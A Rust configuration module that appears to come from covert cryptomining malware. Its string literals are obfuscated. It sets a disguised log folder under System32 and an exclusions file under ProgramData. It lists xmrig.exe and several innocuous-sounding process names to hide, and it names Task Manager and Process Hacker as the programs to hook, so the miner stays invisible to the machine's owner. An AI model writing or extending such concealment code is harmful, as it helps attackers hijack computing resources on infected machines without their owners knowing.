use std::path::PathBuf;
use obfstr::obfstr as s;
use shared::utils::functions::{ programdata_dir, system32_dir };

pub fn log_directory() -> PathBuf {
    system32_dir().join(s!("sppn"))
}

pub fn default_query_hook_exclusions() -> Vec<String> {
    vec![
        s!("xmrig.exe").to_owned(),
        s!("WinHandler64.exe").to_owned(),
        s!("SharedDataPolicy.exe").to_owned(),
        s!("llvm86.exe").to_owned(),
        s!("WndSec.exe").to_owned()
    ]
}

pub fn query_hook_processes() -> Vec<String> {
    vec![s!("taskmgr.exe").to_owned(), s!("processhacker.exe").to_owned()]
}

pub fn query_hook_exclusions_file_path() -> PathBuf {
    programdata_dir().join(s!("cwl")).join(s!("c")).join(s!("incl.t"))
}

pub fn query_hook_dll_name() -> String {
    s!("lib.dll").to_owned()
}
pub fn client_version() -> u64 {
    1
}
pub fn client_tag() -> String {
    s!("temp-tag").to_owned()
}
